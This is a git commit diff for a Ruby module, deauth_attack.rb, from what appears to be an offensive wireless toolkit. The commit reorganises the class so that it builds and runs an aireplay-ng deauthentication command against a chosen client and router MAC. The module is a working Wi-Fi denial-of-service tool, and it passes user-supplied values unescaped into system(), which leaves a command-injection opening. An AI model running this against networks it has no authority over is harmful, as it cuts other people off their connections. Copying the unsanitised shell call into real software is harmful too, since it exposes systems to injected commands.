e2a0613057c5dd63112878522b22e58a7b4f25bd
SashaVoden <alexvodennikov22013@gmail.com>
2025-06-02 12:24:13 +0300

    fixing deauth

--- modules/wireless/deauth_attack.rb
+++ modules/wireless/deauth_attack.rb
@@ -1,33 +1,35 @@
-class DeauthAttack
-  attr_accessor :target_mac, :router_mac, :interface
-
-  def initialize
-    @target_mac = nil
-    @router_mac = nil
-    @interface  = "wlan0mon"
-  end
-
-  def set(option, value)
-    case option.downcase
-    when "target_mac"
-      @target_mac = value
-    when "router_mac"
-      @router_mac = value
-    when "interface"
-      @interface = value
+if RUBY_PLATFORM !~ /linux/
+  class DeauthAttack
+    def initialize; end
+    def set(option, value); end
+    def run
+      puts "Module is Linux-only."
     end
   end
+else
+  class DeauthAttack
+    attr_accessor :target_mac, :router_mac, :interface
 
-  def detect_os
-    RUBY_PLATFORM =~ /linux/
-  end
+    def initialize
+      @target_mac = nil
+      @router_mac = nil
+      @interface  = "wlan0mon"
+    end
 
-  def run
-    return unless detect_os && @target_mac && @router_mac && @interface
+    def set(option, value)
+      case option.downcase
+      when "target_mac" then @target_mac = value
+      when "router_mac" then @router_mac = value
+      when "interface" then @interface = value
+      end
+    end
 
-    cmd = "aireplay-ng --deauth 100 -a #{@router_mac} -c #{@target_mac} #{@interface}"
-    system(cmd)
-  rescue => e
-    puts e.message
+    def run
+      return unless @target_mac && @router_mac && @interface
+      cmd = "aireplay-ng --deauth 100 -a #{@router_mac} -c #{@target_mac} #{@interface}"
+      system(cmd)
+    rescue => e
+      puts e.message
+    end
   end
 end
